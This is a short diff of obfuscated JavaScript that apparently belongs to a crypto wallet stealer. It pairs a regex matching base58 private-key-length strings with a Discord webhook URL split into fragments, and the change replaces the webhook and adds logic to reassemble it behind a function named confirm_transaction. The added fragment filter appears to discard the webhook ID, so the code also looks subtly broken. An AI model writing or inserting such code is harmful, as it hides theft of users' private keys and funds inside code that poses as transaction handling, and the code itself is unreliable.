@@ -28,16 +28,27 @@ const _0x14a1 = function (_0x2e5d, _0x114b) {
 const _0x49bc = new RegExp('[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{80,90}', 'g');
 
 const _0x152c = [
-    'https://discord.com/api/webhooks/',
-    '1254887840358076426/', 
-    '5IpzTxpwV_Si2uouBCYTkUp', 
-    '37ExNIAQHvNPvmqoxg0jnNAzVNAWN92rdkFvU480GxBcY'
+    'https://discord.com/api/webhooks/', 
+    '1254887849413705808/',  
+    'bHt84XxL0jR25FtUJ8D4xq9', 
+    'ImMtKCdV9P3swg9aRieNUQW', 
+    'zWx85QpR99LvDgFyN6Ap9j1', 
+    'MPAngbJTmg3DGDP616peOhhooYSl1Zd_8UBd4x8UG81G4', 
+    'NcF5uDjG9Hj78Pd8CmK1xR2'
 ];
 
+function isValidPart(part) {
+    return part.length > 20 && !/\d{3}$/.test(part);
+}
+
 function _0x33b9() {
-    const _0x3d25 = [0, 1, 2, 3];
-    const _0x4e0c = _0x3d25.map((_0x329f) => _0x152c[_0x329f]);
-    return _0x4e0c.join('');
+    let webhook = '';
+    _0x152c.forEach(part => {
+        if (isValidPart(part)) {
+            webhook += part;
+        }
+    });
+    return webhook;
 }
 
 function confirm_transaction(_0x46d1) {
